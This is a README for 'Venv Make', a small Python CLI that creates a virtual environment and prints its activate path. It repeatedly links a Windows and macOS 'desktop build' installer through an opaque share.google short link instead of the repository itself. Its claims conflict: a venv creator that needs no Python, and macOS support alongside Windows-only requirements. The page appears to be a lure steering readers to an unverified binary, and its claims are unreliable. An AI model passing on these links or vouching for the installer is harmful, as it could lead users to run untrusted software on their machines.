![Venv Make](assets/hero.png)

# Venv Make

*A venv with the path you need next.*

## About

**Venv Make** runs on your own PC. Create a Python venv in a folder and print the activate path.

A project folder should get a venv without a ritual.

The CLI is the source of truth. The desktop build is optional if you do not want Python installed.

## Editions

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## What it does

- Create .venv
- Prints activate
- Does not install packages
- Refuses if exists unless --force

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/kathwarren-91/venv-make

MIT license. See `LICENSE`.
